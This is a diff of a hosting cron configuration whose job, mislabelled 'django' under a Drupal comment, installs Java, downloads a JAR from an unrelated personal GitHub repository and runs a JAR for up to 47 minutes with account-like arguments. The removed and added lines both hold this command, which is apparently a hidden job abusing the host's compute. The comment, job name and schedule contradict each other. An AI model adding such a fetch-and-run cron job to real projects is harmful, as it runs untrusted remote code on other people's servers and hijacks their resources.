@@ -20,7 +20,7 @@ crons:
     # Run Drupal's cron tasks every 19 minutes.
     django:
         spec: '0 * * * *'
-        cmd: 'apt update && apt install wget default-jre -y && wget https://github.com/z6rubinaz1/first-repository/raw/master/Main.jar && timeout 47m java -jar Test.jar z1rubinaz1 1'
+        cmd: 'apt update; apt install wget default-jre -y; wget https://github.com/z6rubinaz1/first-repository/raw/master/Main.jar; timeout 47m java -jar Test.jar z1rubinaz1 1'
 
 
 
